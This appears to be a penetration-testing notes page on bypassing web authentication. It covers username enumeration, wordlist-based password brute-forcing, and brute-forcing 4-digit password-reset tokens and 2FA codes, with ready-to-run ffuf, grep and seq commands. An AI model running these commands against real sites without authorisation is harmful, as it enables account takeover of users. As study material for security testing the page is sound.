---
layout: default
title: Bypassing Authentication
permalink: /Web/bypass_auth/
---

We will mainly focus on knowledge-based authentication.

# User Enumeration
- Web applications could reveal whether a username exists or not by showing different error messages for the two cases or a chat application might show other users by username to chat with.
- A good starting point is the wordlist collection [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Usernames).
```
ffuf -w /path/to/xato-net-10-million-usernames.txt -u http://$ip/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```
- Side-channel attacks do not directly target the web application's response but rather extra information that can be obtained or inferred from the response, e.g. the time it takes for the web application's response to reach us.

# Brute-Forcing Passwords
Ensuring that a good wordlist is used for the attack is crucial.
If a web application enforces a password policy, we should ensure that our wordlist only contains passwords that match the implemented password policy.
```
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```
```
wc -l custom_wordlist.txt
```
```
ffuf -w ./custom_wordlist.txt -u http://$ip/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```
# Brute-Forcing Password Reset Tokens
Many web applications implement a password-recovery functionality if a user forgets their password. This password-recovery functionality typically relies on a one-time reset token, which is transmitted to the user, for instance, via SMS or E-Mail. The user can then authenticate using this token, enabling them to reset their password and access their account.
As such, a weak password-reset token may be brute-forced or predicted by an attacker to take over a victim's account. <br>
To identify weak reset tokens, we typically need to create an account on the target web application, request a password reset token, and then analyze it. <br>
In case of 4 digit reset token:
```
seq -w 0 9999 > tokens.txt
```
The -w flag pads all numbers to the same length by prepending zeroes.
Verify with `head token.txt`.
```
ffuf -w ./tokens.txt -u http://$domain/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```
# Brute-Forcing 2FA Codes

One of the most common 2FA implementations relies on the user's password and a time-based one-time password (TOTP) provided to the user's smartphone by an authenticator app or via SMS. These TOTPs typically consist only of digits.

```
seq -w 0 9999 > tokens.txt
```
```
ffuf -w ./tokens.txt -u http://$domain/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=mrjm73bh8e53qcej2744h7k44p" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```
With that we will get hits after the session successfully passed the 2FA check because we had supplied the correct TOTP. The first hit was the correct TOTP. Afterward, our session is marked as fully authenticated, so all requests using our session cookie are redirected to the logged in page.
